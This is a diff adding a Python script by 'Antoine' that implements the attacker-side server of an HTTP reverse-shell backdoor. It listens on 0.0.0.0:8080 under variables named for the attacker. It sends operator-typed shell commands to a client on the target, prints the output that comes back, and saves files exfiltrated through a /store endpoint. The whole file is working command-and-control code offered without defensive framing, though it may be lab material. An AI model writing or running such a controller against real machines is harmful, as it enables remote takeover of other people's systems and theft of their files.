@@ -1,0 +1,64 @@
+# -*- coding: utf-8 -*-
+"""
+Created on Fri Nov  1 15:08:25 2024
+
+@author: Antoine
+
+"""
+
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import parse_qs
+import os,cgi
+
+HTTPSTATUSOK = 200
+
+
+ATTACKERlocalIP = '0.0.0.0'
+ATTACKERPORT = 8080
+
+class MyHandler(BaseHTTPRequestHandler):
+
+    def log_message(self, format, *args):
+        pass
+
+    def save_file(self, length):
+        data = parse_qs(self.rfile.read(length).decode())
+        with open('/tmp/downloaded_file','wb') as output_file:
+            output_file.write(data["rfile"][0].encode())
+        print("File saved as /tmp/downloaded_file")
+
+    # Send command to client (on Target)
+    def do_GET(self):
+        command = input("Shell> ")
+        self.send_response(HTTPSTATUSOK)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+        self.wfile.write(command.encode())
+
+    def do_POST(self):
+        length = int(self.headers['Content-Length'])
+        self.send_response(200)
+        self.end_headers()
+
+        if self.path == '/store':
+            try:
+                self.save_file(length)
+            except Exception as e:
+                print(e)
+            finally:
+                return
+
+        data = parse_qs(self.rfile.read(length).decode())
+        if "rfile" in data:
+            print(data["rfile"][0])
+
+
+if __name__ == '__main__':
+    myServer = HTTPServer((ATTACKERlocalIP, ATTACKERPORT), MyHandler)
+
+    try:
+        print(f'[*] Server started on {ATTACKERlocalIP}:{ATTACKERPORT}')
+        myServer.serve_forever()
+    except KeyboardInterrupt:
+        print('[!] Server is terminated')
+        myServer.server_close()
